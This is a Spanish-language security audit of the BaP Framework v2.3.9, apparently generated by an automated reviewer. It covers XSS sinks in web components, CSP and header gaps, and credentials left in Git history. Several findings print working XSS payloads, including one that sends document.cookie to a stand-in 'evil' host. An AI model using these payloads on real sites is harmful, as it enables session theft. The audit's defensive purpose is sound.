# 🔒 Informe de Auditoría de Seguridad — BaP Framework v2.3.9

> **Analista:** Auditoría automatizada de código fuente (white-box)
> **Fecha:** Junio 2026
> **Versión auditada:** `v2.3.9`
> **Alcance:** Análisis estático completo del código fuente, configuración de build, hosting (principal y CDN), historial de Git y dependencias.
> **Repositorio:** `GonzaloArenasF/BaP_Framework`
> **Auditorías previas de referencia:** [`security-audit-v2.0.1.md`](./security-audit-v2.0.1.md), [`security-audit-v2.3.7.md`](./security-audit-v2.3.7.md)

---

## Resumen Ejecutivo

Esta es la **tercera auditoría de seguridad formal** del framework, realizada sobre la versión `v2.3.9`, tras la ronda de correcciones documentada en [`security-fixes-v2.3.7.md`](./security-fixes-v2.3.7.md) (que cerró 9 de 11 hallazgos previos en v2.3.8/v2.3.9).

El análisis **verificó el estado real de las correcciones de v2.3.7** y realizó un barrido nuevo, esta vez ampliando el alcance a tres superficies que las auditorías anteriores no cubrieron en profundidad: el **historial de Git**, la **configuración del sitio CDN** y las **dependencias transitivas (`npm audit`)**.

Resultado: **1 corrección anterior incompleta (regresión)** y **14 hallazgos nuevos**.

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 Crítica | 0 | — |
| 🟠 Alta | 4 | Corrección prioritaria |
| 🟡 Media | 6 | Planificación a corto plazo |
| 🔵 Baja | 5 | Deuda técnica a gestionar |

> El hallazgo de mayor impacto operativo (SEC-01) no es una vulnerabilidad de código sino una **exposición persistente en el historial de Git**: el bundle compilado `public/_main/constants.js` fue versionado en commits antiguos (antes de la corrección VUL-14) e incluye, en texto plano y pese a la ofuscación, las credenciales reales de Firebase, la clave de sitio de reCAPTCHA Enterprise y direcciones IP de red interna.

**Fortalezas verificadas en v2.3.9 (correcciones de v2.3.7 que SÍ resistieron revisión):**
- ✅ **NEW-01** — `bap-notification` sanitiza `element.innerHTML` con DOMPurify antes de inyectarlo. Verificado en `bap-notification.js:83`.
- ✅ **NEW-02** — `bap-svg-image` aplica `sanitizeHTML()` al contenido SVG. Verificado en `bap-svg-image.js:56`.
- ✅ **NEW-03** — `bap-header` valida `color-mode` contra allowlist (`sanitizeColorMode`). Verificado.
- ✅ **NEW-06** — Los tres `fetch()` de plantillas usan `AbortController` (timeout 8s) y validan `response.ok`. Verificado.
- ✅ **NEW-08** — `router.js` cancela el listener `onAuthStateChanged` previo (`_unsubscribeAuthListener`). Verificado en `router.js:178-206`.
- ✅ **NEW-10** — `paramsToQueryParams()` usa `encodeURIComponent()` en clave y valor. Verificado en `router.js:25-29`.
- ✅ **NEW-09** — `isMobile()` usa `matchMedia("(pointer: coarse)")` como señal primaria. Verificado.
- ✅ **Criptografía** — `secureEncryptData/secureDecryptData` usan AES-GCM 256, PBKDF2 (100k iteraciones, SHA-256), salt de 16 bytes e IV de 12 bytes aleatorios por operación. Empaquetado Salt+IV+Ciphertext correcto. Verificado en `storage.js:98-192`.
- ✅ **Router** — `loadContent()` instancia componentes con `document.createElement` + `setAttribute` y valida nombres de atributo con regex. Verificado en `router.js:93-120`.
- ✅ **Build** — La validación VUL-04 en `gulpfile.js:56-72` aborta el build de producción con Firebase inactivo. Verificado.

---

## Arquitectura Analizada

```
BaP Framework v2.3.9
├── src/
│   ├── _main/
│   │   ├── constants.js        ← Tokens %%...%% + autodetección de entorno (Regla de Oro → SEC-10)
│   │   ├── firebaseInit.js     ← Firebase + App Check; SDK desde gstatic sin SRI (SEC-05/sistémico)
│   │   ├── auth.js             ← Whitelist RTDB client-side; enforcement real depende de Security Rules (SEC-09)
│   │   ├── router.js           ← ✅ createElement + setAttribute + unsubscribe + encodeURIComponent
│   │   ├── storage.js          ← ✅ AES-GCM async; ⚠️ rama DB sin sanitizar (SEC-11); Base64 síncrono deprecado
│   │   └── i18n.js             ← ✅ sanitizeHTML(DOMPurify); ⚠️ import CDN sin SRI/fallback (SEC-05)
│   └── _components/
│       ├── bap-dialog/         ← ⚠️ isSafeImageUrl + href Base64: validan esquema pero NO comillas (SEC-02)
│       ├── bap-chip/           ← ⚠️ innerHTML del host inyectado sin sanitizar (SEC-03)
│       ├── bap-loading-state/  ← ⚠️ innerHTML + atributo inyectados sin sanitizar (SEC-04)
│       ├── bap-notification/   ← ✅ sanitizado (NEW-01)
│       ├── bap-svg-image/      ← ✅ sanitizado (NEW-02)
│       └── bap-header/         ← ✅ allowlist colorMode (NEW-03)
├── firebase.json               ← ⚠️ sin HSTS (SEC-07); CSP con 'unsafe-inline' e img-src amplio (SEC-08)
├── cdn/firebase.json           ← ⚠️ SIN cabeceras de seguridad; typo en site name (SEC-06)
├── .firebase/hosting.*.cache   ← ⚠️ artefacto de despliegue versionado (SEC-12)
├── public/ (en historial Git)  ← 🟠 credenciales reales en commits antiguos (SEC-01)
└── package.json                ← ⚠️ deps transitivas con CVEs moderados (SEC-13)
```

---

## Estado de Correcciones Previas (v2.3.7 → v2.3.9)

| ID | Descripción | Estado declarado | Estado real verificado |
|----|-------------|------------------|------------------------|
| REG-01 | `sanitizeHTML()` → DOMPurify | ✅ v2.3.8 | ✅ Verificada (`i18n.js:12`, allowlist exhaustiva) |
| REG-02 | Warning en storage síncrono | ✅ v2.3.8 | ✅ Verificada (`storage.js:344,400,455`) |
| REG-03 | `ENV_URL` runtime | ✅ Aceptada | ✅ Diseño intencional confirmado |
| NEW-01 | XSS `bap-notification` | ✅ v2.3.9 | ✅ Verificada |
| NEW-02 | SVG `bap-svg-image` | ✅ v2.3.9 | ✅ Verificada |
| NEW-03 | `colorMode` `bap-header` | ✅ v2.3.9 | ✅ Verificada |
| **NEW-04** | **`<img src>` `bap-dialog`** | **✅ v2.3.9** | **⚠️ INCOMPLETA → ver SEC-02** |
| NEW-05 | Rate limiting login | 📋 Deuda técnica | ⏳ Sigue sin implementar (reiterado en SEC-09) |
| NEW-06 | `fetch()` sin timeout/errores | ✅ v2.3.9 | ✅ Verificada |
| NEW-07 | CSP `'unsafe-inline'` | 📋 Recomendación | ⏳ Sigue presente → ver SEC-08 |
| NEW-08 | `onAuthStateChanged` unsubscribe | ✅ v2.3.9 | ✅ Verificada |
| NEW-09 | `isMobile()` userAgent | ✅ v2.3.9 | ✅ Verificada |
| NEW-10 | `paramsToQueryParams` encode | ✅ v2.3.9 | ✅ Verificada |
| NEW-11 | Rutas RTDB en bundle | 📋 Recomendación | ⏳ `/allowed_users` sigue en `bap.config.json` |

---

## Regresión / Corrección Incompleta

### ⚠️ SEC-02 — 🟠 Alta — `bap-dialog`: la validación de URL valida el **esquema** pero no impide romper el atributo (corrección incompleta de NEW-04)

**Archivo:** `src/_components/bap-dialog/bap-dialog.js:30-39`, `56-64`, `116-125`

**Descripción:**
La corrección de NEW-04 introdujo `isSafeImageUrl()` y una validación de esquema para los enlaces Base64. Ambas validaciones confirman que la URL **empiece** con `https://` / `http://`, pero **no rechazan comillas dobles ni otros caracteres que escapan del contexto del atributo HTML**. Como las URLs se siguen insertando por **interpolación de string** dentro de un atributo entrecomillado, una URL que pase la validación de esquema pero contenga una comilla doble permite inyectar atributos arbitrarios.

```javascript
// bap-dialog.js:30-39
function isSafeImageUrl(url) {
  if (!url) return false;
  const lower = url.trim().toLowerCase();
  if (lower.startsWith("https://") || lower.startsWith("http://")) return true; // ← NO valida comillas
  if (!lower.includes(":") && !lower.startsWith("//")) return true;
  return false;
}

// bap-dialog.js:56-58 — la URL se interpola cruda dentro del atributo src
const leftImg = isSafeImageUrl(props.imageHeaderLeft)
  ? `<img src="${props.imageHeaderLeft}" alt="Encabezado Izquierdo" />`
  : "";
```

El mismo patrón afecta al enlace Base64 (`bap-dialog.js:117-125`): se valida `isSafeProtocol` pero `decodedUrl` se interpola cruda en `href="${decodedUrl}"`.

**Escenario de riesgo:**
Un valor de atributo (proveniente de query params vía `router.js → setAttribute`, de datos de RTDB, o de cualquier código que instancie `<bap-dialog>`) como:

```html
<bap-dialog image-header-left='https://x&quot; onerror=&quot;fetch(`//evil/?c=`+document.cookie)'>
```

produce, tras la interpolación:

```html
<img src="https://x" onerror="fetch(`//evil/?c=`+document.cookie)" alt="Encabezado Izquierdo" />
```

→ **XSS por inyección de atributos** (event handler `onerror`). La validación de esquema se supera porque la cadena efectivamente empieza con `https://`. El cuerpo (`bodyContent`) y los títulos sí pasan por `sanitizeHTML()`, pero las **URLs de imagen y de enlace no**, porque se tratan como atributos y no como contenido.

**Impacto:** XSS con acceso completo al `document` global (robo de sesión/cookies, acciones en nombre del usuario, exfiltración).

**Plan de mitigación:**
1. **Preferido:** construir las imágenes y enlaces con la **API del DOM** en `postRender()`, donde el navegador normaliza la URL y nunca interpreta comillas como ruptura de atributo:
   ```javascript
   const img = document.createElement("img");
   img.src = props.imageHeaderLeft; // el navegador rechaza/normaliza esquemas peligrosos
   img.alt = "Encabezado Izquierdo";
   container.appendChild(img);
   ```
2. **Alternativa mínima:** endurecer `isSafeImageUrl()` y la validación Base64 para **rechazar** cualquier URL que contenga `"`, `'`, `<`, `>`, espacios o backticks, además de validar el esquema con `new URL()`.

---

## Hallazgos Nuevos

### 🟠 SEC-01 — Alta — Credenciales reales y clave de reCAPTCHA persisten en el historial de Git (bundle compilado versionado)

> **🔵 RECLASIFICADO A RIESGO ACEPTADO (post-análisis).** La severidad 🟠 Alta de abajo era conservadora. Tras análisis contextual, este hallazgo se reclasifica a **Riesgo Aceptado sin corrección de código**: las claves expuestas son públicas por diseño en el modelo de Firebase web (la config debe ir al bundle por CDN), la defensa real (App Check *enforced* + **reCAPTCHA restringido por dominio**) ya está aplicada y neutraliza el site key reutilizado, las Security Rules son responsabilidad del desarrollador que implementa el framework (cubierta por la licencia), y `public/` no se versiona desde VUL-14. Ver fundamentación completa en [`security-fixes-v2.3.9.md`](./security-fixes-v2.3.9.md) → *Hallazgo Reclasificado a Riesgo Aceptado*.

**Ubicación:** Historial de Git — `public/_main/constants.js` en commits previos a `ac8b4ee0` (corrección VUL-14, v2.2.9).

**Descripción:**
La corrección VUL-14 dejó de versionar la carpeta `public/`, pero **no purgó el historial**. Los commits antiguos todavía contienen el bundle compilado `public/_main/constants.js`, en el que el pipeline de Gulp ya había reemplazado los tokens `%%...%%` por valores reales. Aunque el archivo está ofuscado con `gulp-javascript-obfuscator`, **el ofuscador NO cifra los literales de string**: las credenciales aparecen en texto plano dentro del array de strings del propio bundle. Recuperables con:

```
git show <commit_antiguo>:public/_main/constants.js
```

Valores expuestos en el historial (entre otros):
- `apiKey`, `projectId`, `appId`, `messagingSenderId`, `storageBucket`, `measurementId` de Firebase.
- **Clave de sitio de reCAPTCHA Enterprise** (`6Lf...`).
- **Direcciones IP de red interna/LAN** usadas en desarrollo (`192.168.x.x`, `172.20.x.x`) y la URL de producción.

**Escenario de riesgo:**
Las API keys *web* de Firebase están diseñadas para ser públicas (la protección real recae en App Check + Security Rules), por lo que el riesgo directo de la apiKey es acotado. Sin embargo:
1. Cualquiera que clone el repo (o si se hace público) obtiene el identificador exacto del proyecto y la clave de reCAPTCHA, facilitando enumeración y abuso de cuota.
2. **La ofuscación queda desmentida como medida de protección de IP/secretos**: si el modelo de amenazas asume que ofuscar oculta valores, esa premisa es falsa.
3. Las IPs de LAN revelan topología de la red de desarrollo (información de reconocimiento).

**Plan de mitigación:**
1. **Confirmar que la apiKey de Firebase no es sensible en este modelo** (lo es solo si App Check y las Security Rules están bien configuradas → ver SEC-09). Si las reglas no son estrictas, **rotar las credenciales**.
2. Considerar **purgar el historial** con `git filter-repo` (o BFG) para eliminar `public/**` de todos los commits, especialmente si el repositorio pasará a ser público. Sopesar el costo de reescribir el historial.
3. **Nunca documentar la ofuscación como mecanismo de confidencialidad de secretos**; sirve solo para dificultar la lectura del flujo lógico, no para ocultar literales.
4. Restringir la apiKey en Google Cloud Console (referrers HTTP permitidos) y verificar que reCAPTCHA Enterprise tenga dominios restringidos.

---

### 🟠 SEC-03 — Alta — `bap-chip`: `innerHTML` del host inyectado sin sanitizar

**Archivo:** `src/_components/bap-chip/bap-chip.js:10-11`, `20`

**Descripción:**
El componente lee el contenido del host con `this.innerHTML` y lo interpola directamente en la plantilla vía `replace`, que luego `customComponentsRegistration.js:73` asigna a `template.innerHTML`:

```javascript
// bap-chip.js
function preRender(html, props) {
  return html.replace("{label}", props.label); // ← sin sanitizar ni escapar
}
// ...
label: this.innerHTML.trim(), // ← contenido no confiable del host
```

A diferencia de `bap-notification` y `bap-svg-image` (corregidos en v2.3.9), `bap-chip` **no aplica `sanitizeHTML()`**.

**Escenario de riesgo:**
```html
<bap-chip><img src=x onerror="alert(document.domain)"></bap-chip>
```
El `innerHTML` se reinyecta en `template.innerHTML` → ejecuta el handler `onerror`. Explotable por cualquier flujo que permita poblar el contenido de un `<bap-chip>` con datos no confiables (RTDB, parámetros, contenido generado).

**Impacto:** XSS.

**Plan de mitigación:**
- Importar y aplicar `sanitizeHTML()` sobre `props.label` antes del `replace` (mismo patrón que NEW-01), **o** usar `textContent` en `postRender` si la etiqueta nunca necesita HTML enriquecido (preferible: las chips suelen ser texto plano).

---

### 🟠 SEC-04 — Alta — `bap-loading-state`: `innerHTML` y atributo inyectados sin sanitizar

**Archivo:** `src/_components/bap-loading-state/bap-loading-state.js:12-13`, `40-42`

**Descripción:**
```javascript
const props = {
  message: this.innerHTML.trim() || "Cargando...",      // ← no confiable
  subMessage: this.getAttribute("sub-message") || "",   // ← no confiable
};
// ...
let htmlWithProps = html.replaceAll("{message}", props.message);
htmlWithProps = htmlWithProps.replaceAll("{sub-message}", props.subMessage ? `<h3>${props.subMessage}</h3>` : "");
template.innerHTML = htmlWithProps; // ← sink: ambos valores sin sanitizar
```

Tanto el contenido del host como el atributo `sub-message` se inyectan sin sanitización ni escape en `template.innerHTML`.

**Escenario de riesgo:**
```html
<bap-loading-state sub-message="<img src=x onerror=alert(1)>">
  <img src=x onerror=alert(2)>
</bap-loading-state>
```
Ambos vectores ejecutan. Aunque hoy se instancia con texto estático, el patrón es inseguro por diseño y replica el problema ya corregido en otros componentes.

**Impacto:** XSS.

**Plan de mitigación:**
- Aplicar `sanitizeHTML()` a `props.message` y `props.subMessage` antes del `replaceAll`, **o** usar `textContent` para el mensaje (es texto de carga, no requiere HTML).

---

### 🟡 SEC-05 — Media — DOMPurify se carga desde CDN externo sin SRI ni fallback local

**Archivo:** `src/_main/i18n.js:12`

**Descripción:**
```javascript
import DOMPurify from "https://cdn.jsdelivr.net/npm/dompurify@3.1.7/dist/purify.es.mjs";
```
DOMPurify —el **único** componente de sanitización del que dependen `bap-notification`, `bap-svg-image`, `bap-dialog` e `i18n`— se importa como ES module remoto. Los `import` estáticos de ESM no admiten atributo `integrity` (SRI), por lo que:
1. No hay verificación de integridad: un compromiso de jsDelivr o un MITM (en redes sin HTTPS estricto) podría servir una versión que **no sanitiza nada**, anulando silenciosamente toda la defensa XSS del framework.
2. Es un **punto único de fallo de disponibilidad**: si el CDN no responde, el `import` falla y se rompe la carga de `i18n.js` y de todos los módulos que dependen de él.

Aunque la versión está fijada (`@3.1.7`) y el origen está en la CSP `script-src`, ni la fijación ni la CSP verifican el *contenido* del recurso.

**Escenario de riesgo:** Compromiso de la cadena de suministro del CDN, o caída del CDN → degradación total de la sanitización o de la app.

**Plan de mitigación:**
1. **Preferido:** instalar DOMPurify desde npm (ya está en `dependencies`) y **empaquetarlo localmente** en el build de Gulp, sirviéndolo desde el propio origen (`'self'`). Elimina el SRI como problema y el punto único de fallo.
2. **Alternativa:** cargar DOMPurify con `<script>` tradicional con atributo `integrity` (SRI), y verificar en runtime que `typeof DOMPurify.sanitize === "function"` antes de usarlo; si falta, fallar de forma segura (no renderizar HTML).

---

### 🟡 SEC-06 — Media — El sitio CDN (`cdn/firebase.json`) no define ninguna cabecera de seguridad

**Archivo:** `cdn/firebase.json`

**Descripción:**
```json
{ "hosting": { "site": "cdn-bap-framewotk", "public": "public" } }
```
El sitio CDN sirve plantillas HTML, CSS y JS de componentes, pero **no configura ninguna cabecera**: no hay CSP, `X-Frame-Options`, `X-Content-Type-Options: nosniff`, `Referrer-Policy` ni `Strict-Transport-Security`. El sitio principal sí las tiene; el CDN, no.

Adicionalmente, el valor de `site` contiene un **typo**: `cdn-bap-framewotk` (en lugar de `framework`). Si es intencional coincide con el sitio real de Firebase, pero conviene verificarlo: un nombre incorrecto puede provocar un despliegue a un sitio inexistente o equivocado.

**Escenario de riesgo:**
- Sin `X-Frame-Options`/`frame-ancestors`: las plantillas servidas desde el CDN pueden ser embebidas en un iframe de un sitio malicioso (clickjacking / UI redressing).
- Sin `nosniff`: un recurso servido con Content-Type ambiguo puede ser interpretado como ejecutable (ataques polyglot).
- Sin HSTS: vulnerable a SSL stripping en la primera conexión.

**Plan de mitigación:**
1. Replicar en `cdn/firebase.json` el bloque `headers` del `firebase.json` principal (al menos `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Strict-Transport-Security`).
2. Verificar el nombre del sitio (`cdn-bap-framewotk`) contra la consola de Firebase.

---

### 🟡 SEC-07 — Media — Falta `Strict-Transport-Security` (HSTS) en el sitio principal

**Archivo:** `firebase.json:36-45`

**Descripción:**
El bloque de cabeceras incluye `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` y CSP, pero **no incluye `Strict-Transport-Security`**. Sin HSTS, la primera petición de un usuario (o tras expirar la caché) puede degradarse a HTTP y ser interceptada antes del redirect a HTTPS.

**Escenario de riesgo:** Un atacante en la red (Wi-Fi público, MITM) realiza SSL stripping en la conexión inicial, sirviendo una versión manipulada antes de que el navegador fuerce HTTPS.

**Plan de mitigación:**
Añadir a la cabecera `**` del `firebase.json`:
```json
{ "key": "Strict-Transport-Security", "value": "max-age=31536000; includeSubDomains; preload" }
```
(Evaluar `preload` solo si se desea inscripción en la lista HSTS de navegadores, que es difícil de revertir.)

---

### 🟡 SEC-08 — Media — Debilidades en la CSP: `'unsafe-inline'` en estilos y `img-src` demasiado amplio

**Archivo:** `firebase.json:44`

**Descripción:**
La CSP mantiene dos puntos débiles:
1. `style-src 'self' 'unsafe-inline' ...` — ya señalado en NEW-07 (sigue abierto). Permite estilos inline, habilitando CSS injection (exfiltración por selectores de atributo, overlays de phishing).
2. `img-src 'self' data: https:` — `https:` permite cargar imágenes desde **cualquier** host HTTPS. Combinado con un sink de atributos como el de SEC-02, facilita exfiltración por URL de imagen y *tracking* hacia servidores arbitrarios. `data:` en `img-src` también amplía la superficie.

**Escenario de riesgo:**
- CSS injection vía `style` inline para exfiltrar valores de formularios o crear señuelos visuales.
- Exfiltración de datos en la query string de una URL de imagen apuntando a un host arbitrario (`<img src="https://evil/?c=...">`), permitida por `img-src https:`.

**Plan de mitigación:**
1. Migrar los `style="..."` inline de los componentes (p.ej. `bap-svg-image`) a clases CSS y eliminar `'unsafe-inline'` de `style-src`.
2. Restringir `img-src` a los orígenes realmente necesarios (`'self'`, el dominio del CDN, y los hosts concretos de Firebase) en lugar de `https:` genérico.

---

### 🟡 SEC-09 — Media — La autorización por whitelist es solo del lado cliente; las Reglas de Seguridad de RTDB no están versionadas

> **✅ MITIGADO en v2.4.0.** Se documentó que los *guards* client-side son UX y no seguridad (README del núcleo + página `core`), se publicó una **plantilla recomendativa de reglas RTDB** (sin desplegarla, para no pisar la configuración del desarrollador) y se **eliminó** el `loginAttempts` sin uso (NEW-05). El endurecimiento real de las Security Rules sigue siendo responsabilidad del desarrollador que implementa el framework (cubierto por la licencia). Ver detalle en [`security-fixes-v2.3.9.md`](./security-fixes-v2.3.9.md) → *SEC-09*.

**Archivos:** `src/_main/auth.js:48-73`, `src/_main/router.js:39-58`

**Descripción:**
`isUserAuthorized()` consulta `/allowed_users/<email>` en RTDB desde el cliente y los *route guards* (`isAccessAllowed`, `sessionStartedControl`) deciden el acceso con ese resultado. Toda esta lógica es **client-side** y, por lo tanto, eludible (un usuario con conocimientos puede saltarse las comprobaciones de JS, modificar el bundle o llamar directamente al SDK). La **seguridad real** depende exclusivamente de las **Firebase Security Rules** del RTDB, que **no están en el repositorio** (`database.rules.json` no existe), por lo que no son auditables ni versionables.

Adicionalmente, sigue pendiente **NEW-05** (rate limiting de login: `loginAttempts: 10` configurado pero sin implementación), lo que mantiene la falsa expectativa de un límite que no existe.

**Escenario de riesgo:**
Si las Security Rules del RTDB permiten lectura/escritura amplia, un usuario autenticado (cualquier cuenta de Google) podría leer la whitelist completa, leer/escribir nodos sensibles, o autoinscribirse en `/allowed_users`. Los *guards* de JavaScript no lo impedirían.

**Plan de mitigación:**
1. **Exportar y versionar** las reglas (`database.rules.json`) y referenciarlas en `firebase.json` (`"database": { "rules": "database.rules.json" }`).
2. Verificar que `/allowed_users` sea de **solo lectura** para el propio usuario (o solo administradores) y que **ningún nodo** sea de escritura pública.
3. Documentar explícitamente que los controles de ruta del framework son de UX, no de seguridad: la frontera de confianza son las Security Rules.
4. Retomar NEW-05 o eliminar `loginAttempts` de la config para no inducir a error.

---

### 🟡 SEC-10 — Media — "Regla de Oro": `FIREBASE_AVAILABLE=false` otorga acceso total (bypass de todos los controles)

> **✅ MITIGADO POR CONTROLES EXISTENTES + DOCUMENTADO en v2.4.0.** Tras análisis, el escenario crítico (bypass en producción con Firebase) **ya está cubierto** por la validación de build (VUL-04, aborta `optimize:prod` inseguro) y la autodetección de hostname público (`constants.js`). El bypass residual es **intencional** (dev local / sitio estático sin Firebase) y afecta solo la navegación de vistas, no el acceso a datos (protegido por Security Rules). **No se aplica *fail-closed*** porque rompería el modo estático legítimo. Se documentó el modelo y el alcance del framework (prototipos/MVP) en `README.md`, `src/_main/README.md` y la página `core`. Ver detalle en [`security-fixes-v2.3.9.md`](./security-fixes-v2.3.9.md) → *SEC-10*.

**Archivos:** `src/_main/auth.js:50`, `src/_main/router.js:50-54`, `233-237`, `src/_main/constants.js:15-31`

**Descripción:**
El framework aplica una "Regla de Oro": si `CONSTANT.FIREBASE_AVAILABLE` es falso, `isUserAuthorized()` retorna `true`, los *route guards* permiten el paso y `userSignIn` simula éxito. Está pensado para desarrollo local sin Firebase, y la validación VUL-04 en Gulp aborta el build de producción si se compila con Firebase desactivado **y** hay `apiKey` en el `.env`.

El riesgo residual: la protección VUL-04 **solo se dispara si existe `apiKey` en el `.env`**. Un despliegue "estático" sin credenciales, o un error de configuración que deje `FIREBASE_AVAILABLE` en falso en un entorno público sin apiKey, dejaría **todos los controles de acceso desactivados** sin que el build lo advierta. La autodetección por hostname (`constants.js:21-24`) mitiga parcialmente forzando `true` en hosts públicos *cuando hay credenciales*, pero depende de esa misma condición.

**Escenario de riesgo:** Sitio desplegado con `FIREBASE_AVAILABLE=false` (deliberado o accidental) → cualquier visitante accede a rutas marcadas como protegidas. Es un único punto de fallo binario para toda la autorización.

**Plan de mitigación:**
1. Hacer que la autodetección de `constants.js` sea *fail-closed* para rutas protegidas en entornos públicos: si el host no es local, **denegar** acceso protegido salvo que Firebase esté operativo (en lugar de hacer bypass).
2. Separar conceptualmente "Firebase no configurado" (sitio 100% estático sin rutas privadas) de "Firebase configurado pero desactivado" (estado inseguro que nunca debería servir rutas privadas).
3. Registrar de forma prominente (no solo `console.warn`) cuando el bypass está activo en un host no local.

---

### 🔵 SEC-11 — Baja — `getFromStorageAsync` (rama DB) devuelve `snapshot.val()` sin sanitizar (XSS almacenado potencial)

**Archivo:** `src/_main/storage.js:221-237`

**Descripción:**
La lectura desde RTDB retorna el valor crudo (`resolve(snapshot.val())`). Si esos datos —potencialmente escribibles por otros usuarios según las Security Rules— se renderizan posteriormente mediante un sink de HTML (p.ej. el contenido de un `<bap-dialog>` o `<bap-chip>`, ver SEC-02/03/04), se materializa un **XSS almacenado**.

**Escenario de riesgo:** Un usuario con permiso de escritura en un nodo RTDB guarda `<img src=x onerror=...>`; otro usuario carga ese dato y lo inserta en un componente que no sanitiza → ejecución.

**Plan de mitigación:**
- La sanitización debe ocurrir en el **punto de renderizado** (cerrar SEC-02/03/04 lo cubre en gran parte). Opcionalmente, ofrecer un flag `sanitize: true` en `getFromStorageAsync` para datos que se sabe irán al DOM.
- Documentar que los datos de RTDB son **no confiables** salvo que las Security Rules garanticen su origen.

---

### 🔵 SEC-12 — Baja — Artefacto de despliegue versionado: `.firebase/hosting.*.cache`

**Archivo:** `.firebase/hosting.cHVibGlj.cache` (trackeado; aparece modificado en `git status`)

**Descripción:**
La caché de despliegue de Firebase Hosting está versionada y no figura en `.gitignore`. No contiene secretos, pero sí un listado de rutas/hashes de los archivos desplegados, genera *diffs* ruidosos en cada deploy y constituye higiene de repositorio deficiente.

**Escenario de riesgo:** Bajo. Fuga menor de la estructura de archivos desplegados y ruido en el control de versiones.

**Plan de mitigación:** Añadir `.firebase/` al `.gitignore` y dejar de versionar el directorio (`git rm -r --cached .firebase`).

---

### 🔵 SEC-13 — Baja — Dependencias transitivas con CVEs moderados (`npm audit`)

**Archivo:** `package.json` / `package-lock.json`

**Descripción:**
`npm audit` reporta vulnerabilidades de severidad *moderate* en paquetes transitivos de Firebase (`@firebase/auth`, `@firebase/firestore`, `@firebase/functions`, etc.) originadas en **`undici`**, con `fixAvailable: true`. Estos paquetes provienen de las dependencias npm de `firebase` y `firebase-tools` (build/test), **no del SDK de runtime**, que se carga desde `gstatic.com/firebasejs/10.11.0` en el navegador. El impacto en producción es por tanto limitado, pero afecta el entorno de build/desarrollo.

**Escenario de riesgo:** Explotación durante el build o en herramientas de desarrollo (no en el cliente desplegado).

**Plan de mitigación:**
- Ejecutar `npm audit fix` (hay fix disponible) y actualizar `firebase`/`firebase-tools` a versiones parcheadas.
- Considerar integrar `npm audit --audit-level=high` en un pipeline CI (ver Recomendaciones Sistémicas).

---

### 🔵 SEC-14 — Baja — IDs de diálogo generados con `Math.random()`

**Archivo:** `src/_components/bap-dialog/bap-dialog.js:184`

**Descripción:**
```javascript
id: this.getAttribute("id") || `bapDialog-${Math.floor(Math.random() * 1000000)}`,
```
`Math.random()` no es criptográficamente seguro y el rango (1.000.000) admite colisiones por la paradoja del cumpleaños. El ID se usa para construir IDs de DOM (`{id}-backdrop`, `{id}-close`). Una colisión causaría que `postRender` enlace eventos al modal equivocado.

**Escenario de riesgo:** Bajo. Sin implicación directa de seguridad, pero colisiones provocan comportamiento errático con múltiples diálogos. (El proyecto ya dispone de `generateUUID` seguro tras VUL-11.)

**Plan de mitigación:** Reutilizar el generador `crypto.randomUUID()` / `generateUUID()` existente para los IDs de componentes.

---

### 🔵 SEC-15 — Baja — Uso de `escape()`/`unescape()` obsoletos en decodificación Base64

**Archivos:** `src/_main/storage.js:45,66`, `src/_components/bap-dialog/bap-dialog.js:105,111`

**Descripción:**
La conversión UTF-8 ↔ Base64 usa `escape()`/`unescape()`, funciones deprecadas del estándar. Funcionan hoy, pero su comportamiento con ciertos caracteres es frágil y podrían eliminarse de futuros motores JS.

**Escenario de riesgo:** Bajo (robustez/mantenibilidad, no explotabilidad).

**Plan de mitigación:** Migrar a `TextEncoder`/`TextDecoder` con `Uint8Array` para la conversión Base64↔UTF-8.

---

## Plan de Mitigación Priorizado

| Prioridad | ID | Acción | Esfuerzo | Área |
|-----------|-----|--------|----------|------|
| 🟠 1 | SEC-02 | Construir `<img>`/`<a>` de `bap-dialog` con DOM API o rechazar comillas en URLs | 2 h | `bap-dialog.js` |
| 🟠 2 | SEC-03 | Sanitizar/`textContent` el label en `bap-chip` | 30 min | `bap-chip.js` |
| 🟠 3 | SEC-04 | Sanitizar `message`/`sub-message` en `bap-loading-state` | 30 min | `bap-loading-state.js` |
| 🟠 4 | SEC-01 | Confirmar no-sensibilidad / rotar credenciales; evaluar purga de historial; restringir apiKey y reCAPTCHA en GCP | 2–4 h | Git / GCP |
| 🟡 5 | SEC-09 | Versionar y endurecer `database.rules.json`; documentar frontera de confianza; retomar NEW-05 | 1 día | Firebase Rules |
| 🟡 6 | SEC-05 | Empaquetar DOMPurify localmente (npm → bundle) o usar SRI + verificación runtime | 3 h | `i18n.js`, `gulpfile.js` |
| 🟡 7 | SEC-10 | Hacer *fail-closed* el bypass de la Regla de Oro en hosts públicos | 3 h | `constants.js`, `router.js`, `auth.js` |
| 🟡 8 | SEC-06 | Añadir cabeceras de seguridad al `cdn/firebase.json`; verificar nombre del site | 1 h | `cdn/firebase.json` |
| 🟡 9 | SEC-08 | Eliminar `'unsafe-inline'` (style-src); restringir `img-src` | 1 día | `firebase.json`, CSS |
| 🟡 10 | SEC-07 | Añadir cabecera HSTS | 15 min | `firebase.json` |
| 🔵 11 | SEC-11 | Sanitizar datos de RTDB en el punto de render (cubierto por SEC-02/03/04) | — | `storage.js` / componentes |
| 🔵 12 | SEC-13 | `npm audit fix`; actualizar firebase/firebase-tools | 1 h | `package.json` |
| 🔵 13 | SEC-12 | `.firebase/` a `.gitignore` y `git rm --cached` | 10 min | `.gitignore` |
| 🔵 14 | SEC-14 | Usar `crypto.randomUUID()` para IDs de diálogo | 20 min | `bap-dialog.js` |
| 🔵 15 | SEC-15 | Migrar `escape/unescape` → `TextEncoder/TextDecoder` | 1 h | `storage.js`, `bap-dialog.js` |

---

## Recomendaciones Sistémicas

1. **Sanitización por defecto, no por componente.** Tres componentes (`bap-notification`, `bap-svg-image`, `bap-dialog`-body) sanitizan, pero `bap-chip` y `bap-loading-state` no, y `bap-dialog` lo hace solo en parte. El patrón recurrente "leer `this.innerHTML` → interpolar en plantilla → `template.innerHTML`" debería centralizarse en `customComponentsRegistration.js`, aplicando `sanitizeHTML()` (o `textContent`) de forma uniforme a todo dato de host/atributo antes de cualquier `replace`/`innerHTML`. Así, un componente nuevo nace seguro por defecto.

